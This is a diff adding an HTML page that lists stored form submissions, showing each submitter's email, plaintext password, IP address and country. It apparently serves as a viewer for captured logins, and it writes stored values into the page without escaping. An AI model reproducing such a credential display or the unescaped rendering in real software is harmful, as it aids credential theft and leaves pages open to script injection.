@@ -1,0 +1,60 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Submissions</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f2f2f2;
+    }
+    h2 {
+      text-align: center;
+    }
+    .submission {
+      background: white;
+      padding: 15px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+    .meta {
+      font-size: 14px;
+      color: gray;
+      margin-bottom: 10px;
+    }
+    .flag {
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    .label {
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>📋 Form Submissions</h2>
+  <div id="submissionsList"></div>  <script>
+    const submissions = JSON.parse(localStorage.getItem("submissions") || "[]");
+    const container = document.getElementById("submissionsList");
+
+    if (submissions.length === 0) {
+      container.innerHTML = '<p style="text-align:center;color:gray">No submissions yet.</p>';
+    } else {
+      submissions.reverse().forEach(sub => {
+        const div = document.createElement("div");
+        div.className = "submission";
+        div.innerHTML = `
+          <div class="meta">
+            <img class="flag" src="${sub.flag}" alt="flag" width="20"> ${sub.country} | IP: ${sub.ip} | ${sub.time}
+          </div>
+          <div><span class="label">Form ID:</span> ${sub.formId}</div>
+          ${sub.email ? `<div><span class="label">Email:</span> ${sub.email}</div>` : ""}
+          ${sub.password ? `<div><span class="label">Password:</span> ${sub.password}</div>` : ""}
+        `;
+        container.appendChild(div);
+      });
+    }
+  </script></body>
+</html>
